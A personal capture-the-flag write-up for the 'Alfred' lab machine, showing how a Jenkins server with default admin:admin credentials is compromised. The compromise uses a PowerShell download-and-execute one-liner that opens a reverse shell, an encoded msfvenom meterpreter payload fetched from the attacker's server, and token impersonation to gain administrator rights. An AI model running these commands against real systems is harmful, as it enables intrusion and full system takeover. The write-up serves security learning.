# Alfred


## Nmap Scan
```$ nmap -sV -v -oN scans/initial_scan.nmap 10.10.118.177```
```$ nmap -A -p- -v -oN scans/all_scan.nmap 10.10.31.121```
PORT     STATE SERVICE
80/tcp   open  http
3389/tcp open  ms-wbt-server
8080/tcp open  http-proxy


## Eumeration

HTTP server on port 8080 has username & password: admin:admin

Jenkin's projects seems to allow command execution, output is avalible to us


## Exploitation

By configuring the premade project we can insert our own command:
```powershell iex (New-Object Net.WebClient).DownloadString('http://$LOCAL_IP:8000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress $LOCAL_IP -Port 9999```

Then setup an HTTP Python server to hold the Invoke-PowerShellTcp.ps1 shell:
```python3 -m http.server```

Finally set up NC listener:
```nc -lnvp 9999```

Build the project, get a shell!


## Upgrading Shell

Upgrading a shell is very nice, meterpreter provides a lot of commands that are normally hard to do on a normal shell

Plus we have post scripts from metasploit that we can use with a meterpreter shell

I tried using post/multi/manage/shell_to_meterpreter but it did not seem to work for some reason, so I will follow the guide

Lets generate a msfvenom payload, host it on the python server, and execute it on the victim

Create shell (in web directory):
```msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=$LOCAL_IP LPORT=9998 -f exe -o mshell.exe```

Then download it:
```powershell "(New-Object System.Net.WebClient).Downloadfile('http://$LOCAL_IP:8000/mshell.exe','mshell.exe')"```


Put up multi/handler on metasploit with the same payload (windows/meterpreter/reverse_tcp) and run the shell:
```Start-Process "mshell.exe"```

Now we have a meterpreter session!


## Privilege Escalation

Attempted to run PowerUp.ps1 but the checks did not find anything

Metasploit's exploit suggester found "windows/local/ms10_092_schelevator" but it gave an error when ran:
```Exploit aborted due to failure: no-target: Running against via WOW64 is not supported, try using an x64 meterpreter...```
I attempted to fix it but to no avail


Show session tokens:
```whoami /priv
PRIVILEGES INFORMATION
----------------------

Privilege Name                  Description                               State   
=============================== ========================================= ========
SeIncreaseQuotaPrivilege        Adjust memory quotas for a process        Disabled
SeSecurityPrivilege             Manage auditing and security log          Disabled
SeTakeOwnershipPrivilege        Take ownership of files or other objects  Disabled
SeLoadDriverPrivilege           Load and unload device drivers            Disabled
SeSystemProfilePrivilege        Profile system performance                Disabled
SeSystemtimePrivilege           Change the system time                    Disabled
SeProfileSingleProcessPrivilege Profile single process                    Disabled
SeIncreaseBasePriorityPrivilege Increase scheduling priority              Disabled
SeCreatePagefilePrivilege       Create a pagefile                         Disabled
SeBackupPrivilege               Back up files and directories             Disabled
SeRestorePrivilege              Restore files and directories             Disabled
SeShutdownPrivilege             Shut down the system                      Disabled
*SeDebugPrivilege                Debug programs                            Enabled* 
SeSystemEnvironmentPrivilege    Modify firmware environment values        Disabled
SeChangeNotifyPrivilege         Bypass traverse checking                  Enabled 
SeRemoteShutdownPrivilege       Force shutdown from a remote system       Disabled
SeUndockPrivilege               Remove computer from docking station      Disabled
SeManageVolumePrivilege         Perform volume maintenance tasks          Disabled
SeImpersonatePrivilege          Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege         Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege   Increase a process working set            Disabled
SeTimeZonePrivilege             Change the time zone                      Disabled
SeCreateSymbolicLinkPrivilege   Create symbolic links                     Disabled
```

Found a potentially dangerous token, "SeDebugPrivilege"

Load the meterpreter incognito module to exploit this

Use "list_tokes -g" to list all of the avalible tokens

The "BUILTIN\Administrators" token is avalible, time to impersonate it:
```impersonate_token "BUILTIN\Administrators"```

Lastly, while our shell is admin, our process may not be. We need to migrate into another process which has the administrator role 

NOTE TO SELF: DO NOT MIGRATE INTO THE SVCHOST.EXE PROCESS. IT SOMETIMES RUNS AS A NETWORK SERVICE, NOT ADMIN

I may have had to restart this step...

Now we are migrated, we have root!
